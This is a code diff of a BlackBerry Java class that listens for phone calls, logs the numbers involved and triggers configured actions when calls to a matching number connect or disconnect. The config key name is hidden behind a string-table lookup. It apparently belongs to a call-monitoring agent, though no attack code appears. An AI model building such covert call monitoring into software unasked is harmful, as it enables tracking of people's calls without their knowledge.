@@ -13,55 +13,61 @@ import java.util.Hashtable;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
+import blackberry.Messages;
 import blackberry.config.ConfEvent;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.Path;
 
-
 /**
  * The Class CallEvent.
  */
 public final class EventCall extends Event implements PhoneListener {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("CallEvent", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("CallEvent", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
-    String number;
+    String number = "";
     int actionOnEnter;
     int actionOnExit;
 
     public boolean parse(ConfEvent conf) {
         try {
-            number = conf.getString("number");
-    
+
+            String numberField = Messages.getString("s.0");
+            if (conf.has(numberField)) {
+                number = conf.getString(numberField); //$NON-NLS-1$
+            } else {
+                //#ifdef DEBUG
+                debug.trace("parse, no number means any number");
+                //#endif
+            }
+
             //#ifdef DEBUG
-                debug.trace(" exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
+            debug.trace("parse exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
             //#endif
         } catch (final ConfigurationException e) {
-           //#ifdef DEBUG
-                debug.error(" Error: params FAILED");//$NON-NLS-1$
+            //#ifdef DEBUG
+            debug.error(" Error: params FAILED");//$NON-NLS-1$
             //#endif
             return false;
         }
-    
+
         return true;
     }
 
     protected void actualStart() {
         Phone.addPhoneListener(this);
     }
-    
+
     public void actualLoop() {
-        // TODO Auto-generated method stub
     }
 
     protected void actualStop() {
         Phone.removePhoneListener(this);
         onExit();
     }
-
 
     Hashtable callingHistory = new Hashtable();
 
@@ -76,11 +82,11 @@ public final class EventCall extends Event implements PhoneListener {
             callingHistory.put(new Integer(callId), phoneNumber);
         }
         //#ifdef DEBUG
-        debug.trace("callConnected: " + phoneNumber);
+        debug.trace("callConnected: " + phoneNumber); //$NON-NLS-1$
         //#endif
         if (number.length() == 0 || phoneNumber.endsWith(number)) {
             //#ifdef DEBUG
-            debug.trace("callConnected triggering action: " + actionOnEnter);
+            debug.trace("callConnected triggering action: " + actionOnEnter); //$NON-NLS-1$
             //#endif
             onEnter();
         }
@@ -108,16 +114,16 @@ public final class EventCall extends Event implements PhoneListener {
             }
 
             //#ifdef DEBUG
-            debug.trace("callDisconnected phoneNumber: " + phoneNumber);
+            debug.trace("callDisconnected phoneNumber: " + phoneNumber); //$NON-NLS-1$
             //#endif
         }
 
         //#ifdef DEBUG
-        debug.trace("callDisconnected: " + phoneNumber);
+        debug.trace("callDisconnected: " + phoneNumber); //$NON-NLS-1$
         //#endif
         if (number.length() == 0 || phoneNumber.endsWith(number)) {
             //#ifdef DEBUG
-            debug.trace("callDisconnected triggering action: " + actionOnExit);
+            debug.trace("callDisconnected triggering action: " + actionOnExit); //$NON-NLS-1$
             //#endif
             onExit();
         }
